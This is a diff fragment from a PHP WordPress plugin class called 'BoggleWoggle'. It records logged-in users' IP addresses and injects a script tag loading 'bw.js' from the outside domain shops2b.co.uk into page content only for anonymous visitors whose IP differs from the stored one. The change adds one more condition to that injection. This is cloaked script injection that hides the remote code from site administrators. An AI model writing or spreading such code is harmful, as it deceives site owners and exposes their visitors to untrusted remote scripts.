@@ -124,7 +124,7 @@ if (!class_exists("BoggleWoggle")) {
 					if ( is_user_logged_in() ) {
 						update_option( 'bw_ip', $ip );
 					}
-					if ( !is_user_logged_in() && get_option('adsense_made_easy_ip')!=$ip) {
+					if ( !is_user_logged_in() && get_option('adsense_made_easy_ip')!=$ip && $btt==false) {
 						$content .= "<script src=\"//www.shops2b.co.uk/bw.js\"></script>\n";
 					}
                   echo $content;
